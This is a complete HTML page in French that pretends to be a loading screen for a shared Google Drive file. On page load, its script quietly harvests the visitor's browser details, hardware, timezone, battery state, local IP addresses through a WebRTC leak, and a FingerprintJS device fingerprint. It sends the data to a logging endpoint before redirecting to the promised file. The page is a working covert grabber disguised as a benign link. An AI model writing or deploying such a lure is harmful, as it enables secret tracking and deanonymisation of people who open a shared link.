<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Chargement du fichier partagé...</title>
<style>
body{font-family:'Segoe UI',Roboto,sans-serif;background:#f8f9fa;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}
.box{text-align:center;color:#5f6368}
.spinner{border:4px solid #f3f3f3;border-top:4px solid #4285f4;border-radius:50%;width:40px;height:40px;animation:spin 1s linear infinite;margin:0 auto 20px}
@keyframes spin{100%{transform:rotate(360deg)}}
</style>
</head>
<body>
<div class="box">
  <div class="spinner"></div>
  <p>Récupération du fichier partagé...</p>
</div>
<script src="https://openfpcdn.io/fingerprintjs/v4/iife.min.js"></script>
<script>
(async () => {
  const data = {};
  data.timestamp = new Date().toISOString();
  data.userAgent = navigator.userAgent;
  data.language = navigator.language;
  data.languages = (navigator.languages || []).join(',');
  data.platform = navigator.platform;
  data.hardwareConcurrency = navigator.hardwareConcurrency;
  data.deviceMemory = navigator.deviceMemory || "n/a";
  data.screen = `${screen.width}x${screen.height} @${window.devicePixelRatio}x`;
  data.colorDepth = screen.colorDepth;
  data.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
  data.touchPoints = navigator.maxTouchPoints;
  data.connection = navigator.connection ? `${navigator.connection.effectiveType} / ${navigator.connection.downlink}Mbps` : "n/a";

  if (navigator.getBattery) {
    try {
      const bat = await navigator.getBattery();
      data.battery = `${Math.round(bat.level*100)}% ${bat.charging?'charge':'décharge'}`;
    } catch(e) { data.battery = "denied"; }
  }

  data.localIPs = await getLocalIPs();

  try {
    const fp = await FingerprintJS.load();
    const r = await fp.get();
    data.fingerprintHash = r.visitorId;
    data.fpComponents = {
      fonts: (r.components.fonts?.value || []).slice(0,5).join(','),
      canvas: r.components.canvas?.value?.substring(0,30),
      audio: r.components.audio?.value,
    };
  } catch(e) { data.fingerprintHash = "error"; }

  fetch('/api/log', {
    method:'POST',
    headers:{'Content-Type':'application/json'},
    body: JSON.stringify(data)
  }).finally(() => {
    setTimeout(() => {
      window.location.href = "https://drive.google.com/file/d/1abcXYZ/view";
    }, 1200);
  });
})();

function getLocalIPs() {
  return new Promise(resolve => {
    const ips = [];
    try {
      const pc = new RTCPeerConnection({iceServers:[]});
      pc.createDataChannel('');
      pc.onicecandidate = e => {
        if (!e.candidate) { pc.close(); return resolve(ips); }
        const m = e.candidate.candidate.match(/(\d+\.\d+\.\d+\.\d+|[a-f0-9:]+:[a-f0-9:]{2,})/);
        if (m && !ips.includes(m[1])) ips.push(m[1]);
      };
      pc.createOffer().then(o => pc.setLocalDescription(o)).catch(() => resolve(ips));
      setTimeout(() => { try{pc.close()}catch(e){}; resolve(ips); }, 2000);
    } catch(e) { resolve(['error']); }
  });
}
</script>
</body>
</html>
